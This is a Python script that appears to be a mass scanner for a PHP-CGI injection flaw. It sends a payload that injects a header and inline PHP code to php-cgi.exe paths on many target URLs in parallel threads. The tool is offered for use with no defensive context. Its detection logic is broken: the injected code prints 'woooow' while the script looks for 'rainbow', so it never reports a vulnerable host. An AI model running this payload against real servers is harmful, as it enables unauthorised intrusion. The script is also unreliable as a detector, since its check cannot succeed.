import requests
import argparse
import threading

def test_cgi_vulnerability(url):
    payloads = [
        '/cgi-bin/php-cgi.exe',
        '/php-cgi/php-cgi.exe'
    ]

    with requests.Session() as session:
        for payload in payloads:
            test_url = url + payload
            try:
                response = session.get(test_url, params={'arg': '%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20"woooow";?>'})
                if "rainbow" in response.text:
                    print(f"Potential vulnerability detected at: {test_url}")
                else:
                    print(f"No vulnerability detected at: {test_url}")
            except requests.RequestException as e:
                print(f"Error testing {test_url}: {e}")

def read_targets_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="Test for CGI vulnerability")
    parser.add_argument('-l', '--list', dest='file_path', help='Path to the file containing target URLs')
    parser.add_argument('-t', '--threads', dest='threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-u', '--url', dest='single_url', help='Test a single URL')
    args = parser.parse_args()

    if args.single_url:
        test_cgi_vulnerability(args.single_url)
        return

    if args.file_path:
        target_urls = read_targets_from_file(args.file_path)
    else:
        parser.error("You must specify either a target URL or a file containing target URLs.")

    threads = []
    for url in target_urls:
        thread = threading.Thread(target=test_cgi_vulnerability, args=(url,))
        threads.append(thread)
        thread.start()

        # Limit the number of active threads
        if len(threads) >= args.threads:
            for t in threads:
                t.join()
            threads = []

    # Join remaining threads
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
